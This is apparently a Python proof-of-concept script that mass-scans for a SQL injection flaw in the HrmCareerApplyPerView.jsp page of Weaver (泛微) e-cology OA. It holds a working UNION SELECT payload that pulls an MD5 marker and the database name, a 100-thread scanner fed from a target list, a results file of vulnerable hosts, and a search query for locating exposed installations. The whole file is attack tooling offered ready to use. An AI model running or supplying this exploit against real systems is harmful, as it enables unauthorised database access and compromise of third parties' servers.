import argparse, requests, sys,json
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """泛微 HrmCareerApplyPerView SQL注入漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='泛微 HrmCareerApplyPerView SQL注入漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="input your url")
    parser.add_argument('-f', '--file', dest='file', type=str, help="input your path")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    api_payload = "/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201,2,sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%271%27)),db_name(1),5,6,7"
    try:
        response = requests.get(url=target + api_payload, verify=False, timeout=10)
        if 'c4ca4238a0b923820dcc509a6f75849' in response.text:
            print(f"[+]{target} 存在sql注入漏洞")
            with open('result.txt', 'a') as f:
                f.write(f"{target}存在sql注入漏洞\n")
        else:
            print(f"[-]{target}不存在sql注入漏洞")
    except:
        print(f"{target}该网站可能存在sql注入漏洞请手工测试")
if __name__ == '__main__':
    main()

# app="泛微-OA（e-cology）"